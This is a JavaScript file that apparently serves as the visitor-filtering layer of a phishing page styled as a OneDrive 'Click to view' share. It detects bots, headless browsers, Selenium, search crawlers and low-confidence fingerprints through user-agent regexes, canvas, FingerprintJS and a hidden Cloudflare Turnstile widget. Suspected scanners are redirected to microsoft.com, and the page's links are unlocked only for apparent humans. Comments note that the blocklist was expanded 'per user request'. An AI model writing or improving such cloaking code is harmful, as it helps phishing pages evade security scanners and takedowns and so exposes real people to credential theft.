(function () {
    const BENIGN_URL = "https://www.microsoft.com";

    // Get button reference for loading state
    const button = document.querySelector('.od-Button--action') || document.getElementById('viewButton');

    // Show loading immediately
    if (button) {
        button.innerHTML = '<span class="spinner"></span> Verifying...';
    }

    // Disable all links initially
    const links = document.querySelectorAll('a');
    links.forEach(l => {
        l.dataset.href = l.href;
        l.removeAttribute('href');
        l.style.opacity = '0.5';
        l.style.pointerEvents = 'none';
        l.style.cursor = 'default';
    });

    // State tracker - BOTH must pass
    const checks = {
        fingerprint: false,
        turnstile: false
    };

    function fail() {
        window.location.href = BENIGN_URL;
    }

    function attemptEnable() {
        // Only enable if BOTH checks passed
        if (checks.fingerprint && checks.turnstile) {
            // Restore button text
            if (button) {
                button.innerHTML = 'Click to view';
            }

            // Enable all links
            links.forEach(l => {
                if (l.dataset.href) l.setAttribute('href', l.dataset.href);
                l.style.opacity = '1';
                l.style.pointerEvents = 'auto';
                l.style.cursor = 'pointer';
            });
        }
    }

    // 1. User-Agent & Webdriver & Plugin Check
    function checkBasicBotSignatures() {
        const ua = navigator.userAgent.toLowerCase();
        // Expanded blocklist per user request
        const botPattern = /bot|crawler|spider|headless|phantomjs|selenium|googlebot|bingbot|yandexbot|slurp|duckduckbot|baiduspider/i;
        // Strict Allowlist: Must verify as a major browser engine
        const modernBrowser = /chrome|firefox|safari|edge|opera/i;

        if (botPattern.test(ua)) return true;
        if (!modernBrowser.test(ua)) return true; // Block non-standard UAs

        if (navigator.webdriver) return true;
        if (!navigator.plugins || navigator.plugins.length === 0) return true;
        return false;
    }

    if (checkBasicBotSignatures()) {
        fail();
        return;
    }

    // 2. Canvas Fingerprint Check
    function isCanvasSuspicious() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Hello World", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Hello World", 4, 17);
            const data = canvas.toDataURL();
            return data.length < 50;
        } catch (e) {
            return true;
        }
    }

    if (isCanvasSuspicious()) {
        fail();
        return;
    }

    // 3. FingerprintJS Integration - Retry Logic
    let fpAttempts = 0;
    const maxFpAttempts = 15; // 1.5 seconds

    const checkFp = setInterval(async () => {
        if (window.FingerprintJS) {
            clearInterval(checkFp);
            try {
                const fpPromise = FingerprintJS.load();
                const fp = await fpPromise;
                const result = await fp.get();
                if (result.confidence && result.confidence.score < 0.3) {
                    fail();
                    return;
                }
                checks.fingerprint = true;
                attemptEnable();
            } catch (e) {
                fail();
            }
        } else {
            fpAttempts++;
            if (fpAttempts >= maxFpAttempts) {
                clearInterval(checkFp);
                console.warn("FingerprintJS Timeout - Failing Open (Privacy extension detected?)");
                // Fail-Open: Allow users with AdBlock to proceed if they pass Turnstile
                checks.fingerprint = true;
                attemptEnable();
            }
        }
    }, 100);

    // 4. Cloudflare Turnstile Integration
    let turnstileAttempts = 0;
    const maxAttempts = 100; // 100 * 100ms = 10 seconds

    const checkTurnstile = setInterval(() => {
        if (window.turnstile) {
            clearInterval(checkTurnstile);
            // Create a hidden container for the widget
            const tContainer = document.createElement('div');
            tContainer.id = 'turnstile-container';
            tContainer.style.display = 'none';
            document.body.appendChild(tContainer);

            try {
                turnstile.render('#turnstile-container', {
                    sitekey: '0x4AAAAAACKFjTbuYuNFiu5q',
                    callback: function (token) {
                        checks.turnstile = true;
                        attemptEnable();
                    },
                    'error-callback': function () {
                        fail();
                    },
                    'timeout-callback': function () {
                        fail();
                    }
                });
            } catch (e) {
                fail();
            }
        } else {
            turnstileAttempts++;
            if (turnstileAttempts >= maxAttempts) {
                clearInterval(checkTurnstile);
                // Fail-open per requirements for loading timeout
                checks.turnstile = true;
                attemptEnable();
            }
        }
    }, 100);
})();